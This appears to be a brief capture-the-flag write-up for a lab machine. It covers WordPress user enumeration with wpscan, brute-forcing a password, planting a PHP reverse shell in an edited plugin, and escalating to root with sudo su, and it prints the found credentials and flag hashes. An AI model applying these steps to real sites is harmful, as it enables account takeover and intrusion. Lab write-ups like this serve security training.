@@ -1,0 +1,59 @@
+
+IP - 10.0.2.12
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Found Wordpress site
+
+run wp-scan
+
+wpscan -e u,ap --url http://10.0.2.12/
+
+
+And, then got username - webmaster
+
+So, I decided to bruteforce with rockyou75 by using burp-suite pro intruder
+
+got password - kittykat1
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Initial Access
+
+I edit hello dolly plugin with pentest-money php reverse shell and activate it got reverse shell.
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+we can easily change user webmaster using his wordpress password - kittykat1
+
+
+Got webmaster flag
+
+83cad236438ff0c0dbce55d7f0034aee18f5c39e
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Priv Escalation
+
+I execute sudo -l and found:
+
+User webmaster may run the following commands on localhost:
+    (ALL) ALL
+
+It's mean we can run whatever command we want so I decided to change root using: sudo su
+
+Boom! I am root now.
+
+webmaster@HF2019-Linux:/tmp$ sudo su
+root@HF2019-Linux:/tmp# whoami
+root
+
+Root Flag
+
+3dcdf93d2976321d7a8c47a6bb2d48837d330624
+
+
+
+
